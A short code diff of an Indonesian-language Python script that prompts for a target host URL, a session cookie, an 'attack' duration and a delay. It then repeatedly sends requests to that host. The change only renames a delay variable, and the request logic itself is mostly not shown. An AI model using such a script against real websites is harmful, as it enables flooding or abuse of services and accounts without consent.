@@ -26,7 +26,7 @@ def main():
     host = get_input("Masukkan URL host: ")
     cookie = get_input("Masukkan cookie: ")
     attack_time = int(get_input("Masukkan waktu (dalam detik) untuk serangan: "))
-    delay = int(get_input("Masukkan jeda (dalam detik) antar request: "))
+    delayt = int(get_input("Masukkan jeda (dalam detik) antar request: "))
 
     # Update the headers with the user-provided cookie
     headers = {
@@ -57,7 +57,7 @@ def main():
                 slow_print(f"Error: {response.status_code}")
         except Exception as e:
             slow_print(f"Terjadi kesalahan: {e}")
-        time.sleep(delay)  # Delay sesuai input pengguna
+        time.sleep(delayt)  # Delay sesuai input pengguna
 
 if __name__ == "__main__":
     main()
